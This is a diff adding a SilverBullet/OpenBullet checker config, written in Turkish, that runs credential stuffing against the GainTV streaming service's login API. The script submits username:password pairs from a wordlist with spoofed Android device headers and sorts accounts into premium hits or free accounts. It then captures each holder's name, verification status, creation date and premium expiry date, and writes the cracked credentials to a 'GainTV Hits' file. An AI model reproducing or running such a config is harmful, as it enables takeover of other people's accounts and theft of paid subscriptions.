@@ -1,0 +1,112 @@
+[SETTINGS]
+{
+  "Name": "Api GainTV Captureli",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-18T13:25:06.8380049+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Astronot",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Api GainTV Captureli",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION RandomString "?l?d?l?d?d?d?d?l?l?d?d?l?d?d?d?d" -> VAR "id" 
+
+REQUEST POST "https://api.gainapis.com/accounts/authenticate" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept-encoding: gzip" 
+  HEADER "content-type: application/json" 
+  HEADER "host: api.gainapis.com" 
+  HEADER "user-agent: Dart/2.16 (dart:io)" 
+  HEADER "x-app-build-number: 189" 
+  HEADER "x-app-language: TR" 
+  HEADER "x-app-version: 3.3.0" 
+  HEADER "x-device-app-type: Mobile" 
+  HEADER "x-device-id: <id>" 
+  HEADER "x-device-manufacturer: Asus" 
+  HEADER "x-device-model: ASUS_Z01QD" 
+  HEADER "x-device-os-version: rel.se.infra.20200730.150525" 
+  HEADER "x-device-platform: android" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials." 
+  KEYCHAIN Success OR 
+    KEY "isPremium\":true" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "isPremium\":false" 
+  KEYCHAIN Retry OR 
+    KEY "429 Too Many Requests" 
+
+PARSE "<SOURCE>" JSON "full_name" CreateEmpty=FALSE -> CAP "İsim Soyisim" 
+
+PARSE "<SOURCE>" JSON "isVerified" -> VAR "isVerified" 
+
+FUNCTION Translate 
+  KEY "false" VALUE "❌ " 
+  KEY "true" VALUE "✔️ " 
+  "<isVerified>" -> CAP "Doğrulama" 
+
+PARSE "<SOURCE>" JSON "created_at" -> VAR "created_at" 
+
+FUNCTION UnixTimeToDate "dd.MM.yyyy" "<created_at>" -> CAP "Hesabın Oluşturulma Tarihi" 
+
+PARSE "<SOURCE>" JSON "premium_expire_date" -> VAR "premium_expire_date" 
+
+FUNCTION UnixTimeToDate "dd.MM.yyy" "<premium_expire_date>" -> CAP "Bitiş Tarihi" 
+
+UTILITY File "DB\\GainTV Hits.txt" AppendLines "----------GainTV----------\\n[+] Hesap : <USER>:<PASS>\\n[+] İsim : <İsim Soyisim>\\n[+] Doğrulama : <Doğrulama>\\n[+] Oluşturulma Tarihi : <Hesabın Oluşturulma Tarihi>\\n[+] Bitiş Tarihi : <Bitiş Tarihi>\\n" 
+
